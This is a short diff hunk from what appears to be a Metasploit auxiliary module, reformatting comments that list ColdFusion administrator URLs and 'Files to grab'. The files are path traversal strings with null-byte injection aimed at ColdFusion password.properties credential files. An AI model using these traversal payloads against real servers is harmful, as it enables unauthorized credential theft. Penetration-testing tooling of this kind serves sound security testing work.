@@ -93,13 +93,14 @@ class Metasploit3 < Msf::Auxiliary
 end
 
 #URL's that may work for you:
-    	#"/CFIDE/administrator/enter.cfm",
-   	#"/CFIDE/wizards/common/_logintowizard.cfm",
-    	#"/CFIDE/administrator/archives/index.cfm",
-	#"/CFIDE/install.cfm",
-	#"/CFIDE/administrator/entman/index.cfm",
-	#"/CFIDE/administrator/logging/settings.cfm",
+#"/CFIDE/administrator/enter.cfm",
+#"/CFIDE/wizards/common/_logintowizard.cfm",
+#"/CFIDE/administrator/archives/index.cfm",
+#"/CFIDE/install.cfm",
+#"/CFIDE/administrator/entman/index.cfm",
+#"/CFIDE/administrator/logging/settings.cfm",
+
 #Files to grab
-	#../../../../../../../../../../ColdFusion8/lib/password.properties%00en
-	#../../../../../../../../../../CFusionMX7/lib/password.properties%00en
-	#../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en
+#../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+#../../../../../../../../../../CFusionMX7/lib/password.properties%00en
+#../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en
